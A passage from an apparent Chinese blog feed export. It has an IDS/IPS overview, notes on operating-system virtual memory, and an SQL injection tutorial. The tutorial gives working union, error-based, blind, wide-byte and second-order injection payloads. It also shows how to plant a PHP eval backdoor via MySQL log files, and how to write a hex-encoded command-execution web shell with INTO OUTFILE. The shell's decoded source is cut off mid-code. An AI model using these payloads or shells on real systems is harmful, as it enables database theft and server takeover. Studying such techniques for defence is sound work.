难以关联捕获的数据包并推断网络扫描正在进行中。</li><li>地址欺骗&#x2F;代理：攻击者可以使用安全性差或配置不正确的代理服务器来阻止攻击，从而增加安全管理员确定攻击来源的难度。如果源被服务器欺骗和退回，则IDS很难检测到攻击的来源。</li><li>模式更改规避：IDS通常依靠“模式匹配”来检测攻击。通过稍微改变攻击中使用的数据，有可能逃避检测。例如，Internet 邮件访问协议 （IMAP） 服务器可能容易受到缓冲区溢出的影响，而 IDS 能够检测到 10 种常见攻击工具的攻击特征。通过修改工具发送的有效负载，使其与 IDS 期望的数据不相似，可以逃避检测。</li></ol><h2 id="入侵防御系统"><a href="#入侵防御系统" class="headerlink" title="入侵防御系统"></a>入侵防御系统</h2><p><strong>入侵防御</strong>系统 （<strong>IPS</strong>），也称为<strong>入侵检测和防御</strong>系统 （<strong>IDPS</strong>），是监控网络或系统活动中恶意活动的网络安全设备。入侵防御系统的主要功能是识别恶意活动，记录有关此活动的信息，报告并尝试阻止或停止它。</p><p>入侵防御系统被认为是入侵检测系统的扩展，因为它们都监视网络流量和&#x2F;或系统活动中的恶意活动。主要区别在于，与入侵检测系统不同，入侵防御系统是在线放置的，能够主动防止或阻止检测到的入侵。IPS 可以采取诸如发送警报、丢弃检测到的恶意数据包、重置连接或阻止来自违规 IP 地址的流量等操作。IPS 还可以纠正循环冗余校验（CRC） 错误、对数据包流进行碎片整理、缓解 TCP 排序问题以及清理不需要的传输和网络层选项。</p><h3 id="为什么产生了IPS系统？"><a href="#为什么产生了IPS系统？" class="headerlink" title="为什么产生了IPS系统？"></a>为什么产生了IPS系统？</h3><ol><li>串行部署的防火墙可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。</li><li>旁路部署的IDS可以及时发现那些穿透防火墙的深层攻击行为，作为防火墙的有益补充，但很可惜的是无法实时的阻断。</li><li>IDS和防火墙联动：通过IDS来发现，通过防火墙来阻断。但由于迄今为止没有统一的接口规范，加上越来越频发的“瞬间攻击”（一个会话就可以达成攻击效果，如SQL注入、溢出攻击等），使得IDS与防火墙联动在实际应用中的效果不显著。</li></ol><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ol><li><strong>基于网络的入侵防御系统（NIPS）：</strong>通过分析协议活动来监控整个网络的可疑流量。</li><li><strong>无线入侵防御系统 （WIPS）：</strong>通过分析无线网络协议来监控无线网络中的可疑流量。</li><li><strong>网络行为分析 （NBA）：</strong>检查网络流量以识别产生异常流量的威胁，例如分布式拒绝服务 （DDoS） 攻击、某些形式的恶意软件和违反策略的行为。</li><li><strong>基于主机的入侵防御系统 （HIPS）：</strong>已安装的软件包，通过分析单个主机内发生的事件来监视该主机是否存在可疑活动。</li></ol><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ol><li>入侵防护：实时、主动拦截黑客攻击、蠕虫、网络病毒、后门木马、Dos等恶意流量，保护企业信息系统和网络架构免受侵害，防止操作系统和应用程序损坏或宕机。</li><li>Web安全：基于互联网Web站点的挂马检测结果，结合URL信誉评价技术，保护用户在访问被植入木马等恶意代码的网站时不受侵害，及时、有效地第一时间拦截Web威胁。</li><li>流量控制：阻断一切非授权用户流量，管理合法网络资源的利用，有效保证关键应用全天候畅通无阻，通过保护关键应用带宽来不断提升企业IT产出率和收益率。</li><li>上网监管：全面监测和管理IM即时通讯、P2P下载、网络游戏、在线视频，以及在线炒股等网络行为，协助企业辨识和限制非授权网络流量，更好地执行企业的安全策略。</li></ol><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>大多数入侵防御系统使用三种检测方法之一：基于签名、基于统计异常和有状态协议分析。</p><h4 id="基于签名的检测"><a href="#基于签名的检测" class="headerlink" title="基于签名的检测"></a>基于签名的检测</h4><p>基于签名的 （误用检测）IDS 监控网络中的数据包，并与预配置和预先确定的攻击模式（称为签名）进行比较。</p><h4 id="基于统计异常的检测"><a href="#基于统计异常的检测" class="headerlink" title="基于统计异常的检测"></a>基于统计异常的检测</h4><p>基于异常的 IDS 将监控网络流量并将其与已建立的基线进行比较。基线将确定该网络的“正常”内容 - 通常使用哪种带宽以及使用什么协议。但是，如果未智能配置基线，则可能会针对合法使用流量发出误报警报。</p><h4 id="有状态协议分析检测"><a href="#有状态协议分析检测" class="headerlink" title="有状态协议分析检测"></a>有状态协议分析检测</h4><p>该方法通过将观察到的事件与“普遍接受的良性活动定义的预定配置文件”进行比较来识别协议状态的偏差。</p>]]></content>
    
    
    
    <tags>
      
      <tag>IDS</tag>
      
      <tag>IPS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统原理——虚拟内存</title>
    <link href="/blog/2022/12/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E2%80%94%E2%80%94%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"/>
    <url>/blog/2022/12/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E2%80%94%E2%80%94%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/</url>
    
    <content type="html"><![CDATA[<p><strong>之前学过的知识慢慢捡起来，为实习面试准备基础知识！</strong></p><p><img src="/images/fj63.jpg"></p><span id="more"></span><h2 id="虚拟内存的一些概念"><a href="#虚拟内存的一些概念" class="headerlink" title="虚拟内存的一些概念"></a>虚拟内存的一些概念</h2><h3 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h3><p>时间局部性:如果执行了程序中的某条指令，那么不久后这条指令很有可能再次执行;如果某个数据被访问过，不久之后该数据很可能再次被访问。(因为程序中存在大量的循环)</p><p>空间局部性:一日程序访问了某个存储单元，在不久之后，其附近的存储单元也很有可能被访问。(因为很多数据在内存中都是连续存放的，并且程序的指令也是顺序地在内存中存放的)</p><h3 id="高速缓冲思想"><a href="#高速缓冲思想" class="headerlink" title="高速缓冲思想"></a>高速缓冲思想</h3><p>将近期会频繁访问到的数据放到更高速的存储器中，暂时用不到的数据放在更低速存储器中。</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p>基于局部性原理，在程序装入时，可以将程序中很快会用到的部分装入内存，暂时用不到的部分留在外存，就可以让程序开始执行。<br>在程序执行过程中，当所访问的信息不在内存时，由操作系统负责将所需信息从外存调入内存，然后继续执行程序。<br>若内存空间不够，由操作系统负责将内存中暂时用不到的信息换出到外存。<br>在操作系统的管理下，进程的可用内存大小比实际内存大小要大得多,但这个“内存大小”不是真实存在的，是通过OS和硬件MMU模拟出来的，在用户看来似乎有一个比实际内存大得多的内存，这就是<strong>虚拟内存</strong>。</p><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ol><li>多次性：无需在作业运行时一次性全部装入内存，而是允许被分成多次调入内存。</li><li>对换性：在作业运行时无需一直常驻内存，而是允许在作业运行过程中，将作业换入、换出。</li><li>虚拟性：从逻辑上扩充了内存的容量，使用户看到的内存容量，远大于实际的容量。</li></ol><h3 id="几种地址"><a href="#几种地址" class="headerlink" title="几种地址"></a>几种地址</h3><ol><li>虚拟地址：虚拟内存中某字节的地址，仿佛该字节存在内存中，其实可能位于磁盘，但这对用户透明</li><li>虚拟地址空间：分配给某程序的虚拟地址范围。</li><li>实地址：物理内存中的某字节地址</li><li>驻留集：进程运行时装入内存的部分</li><li>工作集：实际进程访问到的物理块，驻留集 &gt;工作集</li></ol><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>将程序的逻辑地址空间划分为固定大小的页(page)，而物理内存划分为同样大小的页框(page frame)。程序加载时，可将任意一页放人内存中任意一个页框，这些页框不必连续，从而实现了离散分配。该方法需要CPU的硬件支持，来实现逻辑地址和物理地址之间的映射。</p><p>在系统每次访问虚存页时，都要在内存的所有页表中寻找该页的页框，这是一个很费时间的工作。但是，<strong>人们发现，系统一旦访问了某一个页，那么系统就会在一段时间内稳定地工作在这个页上。所以，为了提高访问页表的速度，系统还配备了一组正好能容纳一个页表的硬件寄存器，这样当系统再访问虚存时，就首先到这组硬件寄存器中去访问，系统速度就快多了。这组存放当前页表的寄存器叫做快表。</strong>工作过程如下图：</p><p><img src="/images/mmu_with_fastpage.jpg"></p><h3 id="缺页中断"><a href="#缺页中断" class="headerlink" title="缺页中断"></a>缺页中断</h3><p>在请求分页系统中，每当要访问的页面不在内存时，便产生一个缺页中断，然后由操作系统的缺页中断处理程序处理中断。此时缺页的进程阻塞，放入阻塞队列，调页完成后再将其唤醒，放入就绪队列。</p><p>若该页面在内存期间被修改过，要将其写回外存。</p><p>缺页中断是因为当前执行的指令想要访问的目标页面未调入内存而产生的，因此属于内中断。一条指令在执行期间，可能产生多次缺页中断。</p><h3 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h3><p>两极页表:32-bit机器上，每个进程地址空间为(2^32^)B,页长4KB，则页表最长将到达(2^20^)1M个项。若每个页表项占4B，则存放这张表将需要连续的4MB连续内存。而且每个进程的页表都可能这么大。</p><p>于是我们可以将这张长页表划分为多个“页表页”（也就是将这张长页表拆开，然后再搞一张页表，这个页表存的是这张长页表被拆开之后各个片段的编号（地址））,这样可以使得页表页也离散地、尽量地占用内存，甚至仅部分装入内存</p><p><img src="/images/mulit-page.png"></p><p>在寻址的过程中，根据p1找到根页表页，根页表中的值再拿去查询内存中的块号（帧号），查到了之后就得到了真正存储想要数值的页表，然后根据页内偏移定位数值。</p><p><strong>Linux系统使用了三级页表结构：页目录（Page Directory，PGD）、中间页目录（Page Middle Directory，PMD）、页表（Page Table，PTE）</strong></p><h2 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h2><p>页面的换入、换出需要磁盘I&#x2F;O，会有较大的开销，因此算法追求更少的缺页率。</p><h3 id="OPT算法-最佳置换"><a href="#OPT算法-最佳置换" class="headerlink" title="OPT算法(最佳置换)"></a>OPT算法(最佳置换)</h3><p>淘汰那些永不再使用或者下次访问距当前时间最长的页面</p><p>最佳，但不可实现，用于衡量其它置换算法性能</p><h3 id="LRU算法-最近最久未使用算法"><a href="#LRU算法-最近最久未使用算法" class="headerlink" title="LRU算法(最近最久未使用算法)"></a>LRU算法(最近最久未使用算法)</h3><p>淘汰在最近一段时间内最近未使用的一页。</p><p>实现: 可为每页添加“上次访问时间戳”，空间开销大。以过去预测将来，最近使用过的页可能很快被再次使用，很久未用的页可能不会被立即使用</p><h3 id="FIFO算法-先入先出算法"><a href="#FIFO算法-先入先出算法" class="headerlink" title="FIFO算法(先入先出算法)"></a>FIFO算法(先入先出算法)</h3><p>淘汰驻留内存时间最久的一页。</p><p>实现：将页面按<strong>调入内存的时间</strong>先后排成一个队列,每次将淘汰队首页，性能差</p><p>Belady异常现象：通常,帧越多则缺页次数越少，但FIFO算法中，有时，帧越多反而缺页率越高</p><h3 id="简单时钟算法"><a href="#简单时钟算法" class="headerlink" title="简单时钟算法"></a>简单时钟算法</h3><p>为每个页面设置一个访问位，再将内存中的页面都通过链接指针链接成一个循环队列。当某页被访问时，其访问位置为1。当需要淘汰一个页面时，只需检查页的访问位。如果是0，就选择该页换出;如果是1，则将它置为0，暂不换出，继续检查下一个页面，若第一轮扫描中所有页面都是1，则将这些页面的访问位依次置为0后，再进行第二轮扫描（第二轮扫描中一定会有访问位为0的页面，因此简单的CLOCK算法选择一个淘汰页面最多会经过两轮扫描)</p><h3 id="时钟算法改进"><a href="#时钟算法改进" class="headerlink" title="时钟算法改进"></a>时钟算法改进</h3><p>简单的时钟置换算法仅考虑到一个页面最近是否被访问过。事实上，如果被淘汰的页面没有被修改过，就不需要执行I&#x2F;O操作写回外存。只有被淘汰的页面被修改过时，才需要写回外存。<br>因此，除了考虑一个页面最近有没有被访问过之外，操作系统还应考虑页面有没有被修改过。在其他条件都相同时，应优先淘汰没有修改过的页面，避免I&#x2F;O操作。这就是改进型的时钟置换算法的思想。修改位&#x3D;0，表示页面没有被修改过;修改位&#x3D;1，表示页面被修改过。</p><p>为方便讨论，用（访问位，修改位）的形式表示各页面状态。如（1，1）表示一个页面近期被访问过，且被修改过。</p><p>算法规则:将所有可能被置换的页面排成一个循环队列<br>第一轮:从当前位置开始扫描到第一个(0,0）的帧用于替换。本轮扫描不修改任何标志位<br>第二轮:若第一轮扫描失败，则重新扫描，查找第一个（0,1）的帧用于替换。本轮将所有扫描过的帧访问位设为0<br>第三轮:若第二轮扫描失败，则重新扫描，查找第一个(0,0）的帧用于替换。本轮扫描不修改任何标志位<br>第四轮:若第三轮扫描失败，则重新扫描，查找第一个(0,1）的帧用于替换。<br>由于第二轮已将所有帧的访问位设为0，因此经过第三轮、第四轮扫描一定会有一个帧被选中，因此改进型时钟置换算法选择一个淘汰页面最多会进行四轮扫描。</p><h2 id="抖动"><a href="#抖动" class="headerlink" title="抖动"></a>抖动</h2><p>刚刚换出的页面马上又换入主存，刚刚换入的页面马上又换出主存，这种频繁的页面调度行为称为抖动或颠簸。</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>抖动发生的主要原因是，进程频繁访问的页面数目高于可用的物理页帧数目，即分配给进程的物理块不够。所有进程工作集的帧需求总量 &gt; 内存帧数</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>抖动时，挂起 一 些进程，释放它们的帧</p><h3 id="预防抖动"><a href="#预防抖动" class="headerlink" title="预防抖动"></a>预防抖动</h3><ol><li>在调度程序中引入工作集算法：当各进程的内存驻 留集足够大时，才调入新作业。</li><li>L&#x3D;S 准则：调整并发度，使得 产生缺页的平均时间 ( 即缺页中断之间的平均时间 ) 等于处理一次缺页中断的平均时间 ，此时 CPU 利用率最高。</li><li>50%准则：磁盘利用率50%时，CPU利用率最高。</li><li>采用局部置换：只在本进程的内存范围内置换。</li><li>当系统并发度较高时，挂起若干进程 （如优先级最低的、最年轻的、发生缺页的、占空间最少的、占空间最多的、剩余运行时间最长的进程</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入的一些理解</title>
    <link href="/blog/2022/11/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
    <url>/blog/2022/11/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><strong>SQL注入是一种常见的Web安全漏洞，在OWASP Top10 2021中<a href="https://chujian521.github.io/blog/2022/10/13/OWASP-Top-10-for-2021-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#A03-%E6%B3%A8%E5%85%A5%E5%BC%8F%E6%94%BB%E5%87%BB">排名第三</a>，主要成因是在前后端数据交互过程中，后端没有对前端传参做严格的判断，导致其传入的恶意数据被拼接到SQL语句中被当作SQL语句的一部分执行，从而导致数据库甚至整个服务器受损</strong></p><p><img src="/images/fj64.jpg"></p><h2 id="常见注入方法"><a href="#常见注入方法" class="headerlink" title="常见注入方法"></a>常见注入方法</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化 </p><p>构造查询语句使union select前面的参数查不出来，执行联合查询时就可以让某个位置输出我们查询的信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查询表名：w73443aep7<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables  <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()#<br>#查字段名<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>#<br>#查数据<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,<span class="hljs-string">&#x27;--&#x27;</span>,username,<span class="hljs-string">&#x27;--&#x27;</span>,password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p><p>可以使用以下构造方式：</p><ul><li>group by 重复键冲突：<code>select 1 from ( select count(*),concat( (select database() from information_schema.tables limit 0,1) , floor(rand()*2) )x from information_schema.tables group by x )a;</code>其中<code>select database() from information_schema.tables limit 0,1</code>查询部分可以更换为任意查询语句，但是需要保证每次输出一个数据，如果想查看下一个需要将limit中的0,1改为1,1，第一个1意思是从第一个开始，第二个1是向下查看一行。</li><li>利用Xpath报错：extractvalue() 函数：<code>extractvalue(1,concat(&#39;^&#39;,(select database()),&#39;^&#39;))</code>或者<code>updatexml(1,concat(&#39;^&#39;,(需要查询的内容),&#39;^&#39;),1)</code></li></ul><h4 id="Floor报错注入"><a href="#Floor报错注入" class="headerlink" title="Floor报错注入"></a>Floor报错注入</h4><p>count(*)建立虚表计算数量时，因为计算时的rand和插入时的rand数值不同而引起的主键冲突从而报错，我们将数据库的名连接，于是就会把数据库名爆出来（本质上报的是冲突的主键名）</p><p>group by会产生虚拟表，floor(rand(0)*2)产生0或1，导致虚拟表主键重复,产生报错</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)</p><p>第一个参数可以随意输入，第二个参数可以是~或者^等不符合xpath格式，于是会把我们查询的报错出来</p><h3 id="布尔盲注和基于时间的盲注"><a href="#布尔盲注和基于时间的盲注" class="headerlink" title="布尔盲注和基于时间的盲注"></a>布尔盲注和基于时间的盲注</h3><p>布尔盲注利用页面是否有错误来判断SQL语句有没有正确执行；基于时间的盲注利用是否执行了延时函数判断语句有没有正确查询。</p><p>因此针对这两种类型的注入，我们要构造判断语句，根据页面是否回显证实猜想，一般用到的函数ascii() 、substr() 、length()，exists()、concat()等，一般步骤如下：</p><ol><li>判断当前数据库类型：<ul><li>Mysql ：exists(select * from information_schema.tables)</li><li>access：exists(select * from msysobjects)</li><li>SQL server：exists(select * from sysobjects).</li></ul></li><li>判断数据库名：<ul><li>二分法判断长度：length(database()) &gt; 5</li><li>二分法判断第一个字符：ascii(substr(database(),1,1)) &gt; 115</li></ul></li><li>判断当前库的表名：<ul><li>二分法判断表数量：and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;3</li><li>二分法判断第一个表长度：and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1))&#x3D;6</li><li>二分法判断第一个表名第二个字符值：and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;100</li></ul></li><li>判断表的字段：<ul><li>判断表中的字段个数：and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’)&gt;5</li><li>判断第一个字段长度：and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1))&gt;5</li><li>判断第一个字段的第一个字段名值：and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100</li></ul></li><li>爆破字段数据（假设users表中有id字段）：<ul><li>猜测字段中数据的长度：and length((select id from users limit 0,1))&gt;5</li><li>判断第一个字符值：and ascii(substr((select id from users limit  0,1),1,1))&gt;100</li></ul></li></ol><p>基于时间盲注与布尔盲注差不多，只是利用了延时函数：and if(ascii(substr(database(),1,1))&#x3D; 115,sleep(5),0)，猜对了就会延时。</p><h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><p>常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方：</p><ul><li>User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中</li><li>cookie：某些字段可能回写入数据库</li><li>Referer：是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</li><li>X-Forwarded-For(XFF)：用来识别客户端最原始的ip地址。</li></ul><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。如果后端堆单引号等注入点做了一些转义，而我们需要绕过这个转义，一般有两种情况：让转义符失去作用，对转义符进行转义，另一个就是让转义符消失，让它变成别的符号。宽字节注入就是属于后者，宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。</p><p>由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的</p><p>我们在前面加上 %df’  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c’，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df ‘ ,被认为運’ ,成功消除了转义函数的影响。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p><h2 id="getshell和提权"><a href="#getshell和提权" class="headerlink" title="getshell和提权"></a>getshell和提权</h2><h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><h4 id="写入常规日志"><a href="#写入常规日志" class="headerlink" title="写入常规日志"></a>写入常规日志</h4><p>前提条件：</p><p><strong>1、知道网站真实物理路径</strong><br><strong>2、root用户身份</strong><br><strong>3、MySQL 版本 &gt; 5.0</strong></p><p>使用<code>SHOW VARIABLES LIKE &#39;%general%&#39;</code>查看日志开启状态</p><p><img src="/images/mysqlLogInfo.png"></p><p>使用<code>set global general_log = &quot;ON&quot;</code>设置日志开启</p><p>设置日志输出路径：<code>set global general_log_file =&#39;web dir/log.php&#39;;</code></p><p>然后执行一条查询，这个查询包含一个一句话后门即可，例如<code>SELECT &#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;;</code>这条查询记录就会被记录在logfile里面，进而可以连接使用该后门。</p><p>同上面方法差不多，也可以写入慢查询日志：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;web dir/slow.php&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="hljs-keyword">from</span> mysql.db <span class="hljs-keyword">where</span> sleep(<span class="hljs-number">5</span>); <br></code></pre></td></tr></table></figure><h4 id="写入outfile"><a href="#写入outfile" class="headerlink" title="写入outfile"></a>写入outfile</h4><p>默认配置一般为NULL即不允许写入，因此这个方法随缘</p><p>查看<strong>secure_file_priv</strong> 参数，如果该参数为空，可以使用该方法，如果是NULL，我们尝试<code>set global secure_file_priv=&#39;&#39;</code>会提示：</p><p>#1238 - Variable ‘secure_file_priv’ is a read only variable</p><p>因此这个参数是不能修改的，只能手动在MySQL配置文件my.ini中修改。secure_file_priv的value为&#x2F;dir&#x2F; ，只允许dir目录下导入导出。</p><p>如果为空的话，我们可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">0x3c3f7068702024633d245f524551554553545b22636d64225d3b407365745f74696d655f6c696d69742830293b4069676e6f72655f757365725f61626f72742831293b40696e695f73657428226d61785f657865637574696f6e5f74696d65222c30293b247a3d40696e695f676574282264697361626c655f66756e6374696f6e7322293b69662821656d70747928247a29297b247a3d707265675f7265706c61636528222f5b2c205d2b2f222c272c272c247a293b247a3d6578706c6f646528272c272c247a293b247a3d61727261795f6d617028227472696d222c247a293b7d656c73657b247a3d617272617928293b7d24633d24632e2220323e26315c6e223b66756e6374696f6e206628246e297b676c6f62616c20247a3b72657475726e2069735f63616c6c61626c6528246e29616e6421696e5f617272617928246e2c247a293b7d69662866282273797374656d2229297b6f625f737461727428293b73797374656d282463293b24773d6f625f6765745f636c65616e28293b7d656c736569662866282270726f635f6f70656e2229297b24793d70726f635f6f70656e2824632c617272617928617272617928706970652c72292c617272617928706970652c77292c617272617928706970652c7729292c2474293b24773d4e554c4c3b7768696c65282166656f662824745b315d29297b24772e3d66726561642824745b315d2c353132293b7d4070726f635f636c6f7365282479293b7d656c73656966286628227368656c6c5f657865632229297b24773d7368656c6c5f65786563282463293b7d656c736569662866282270617373746872752229297b6f625f737461727428293b7061737374687275282463293b24773d6f625f6765745f636c65616e28293b7d656c7365696628662822706f70656e2229297b24783d706f70656e2824632c72293b24773d4e554c4c3b69662869735f7265736f7572636528247829297b7768696c65282166656f6628247829297b24772e3d66726561642824782c353132293b7d7d4070636c6f7365282478293b7d656c7365696628662822657865632229297b24773d617272617928293b657865632824632c2477293b24773d6a6f696e28636872283130292c2477292e636872283130293b7d656c73657b24773d303b7d6563686f223c7072653e24773c2f7072653e223b3f3e</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;web dir/out.php&#x27;</span> <br></code></pre></td></tr></table></figure><p>其中十六进制数字是php后门转的十六进制数<a href="https://www.sojson.com/hexadecimal.html">在线转换网站</a>，原文为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>];@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);@<span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>,<span class="hljs-number">0</span>);<span class="hljs-variable">$z</span>=@<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&quot;disable_functions&quot;</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$z</span>))&#123;<span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[, ]+/&quot;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$z</span>);<span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$z</span>);<span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&quot;trim&quot;</span>,<span class="hljs-variable">$z</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-variable">$z</span>=<span class="hljs-keyword">array</span>();&#125;<span class="hljs-variable">$c</span>=<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; 2&gt;&amp;1\n&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-variable">$n</span></span>)</span>&#123;<span class="hljs-keyword">global</span> <span class="hljs-variable">$z</span>;<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$n</span>)<span 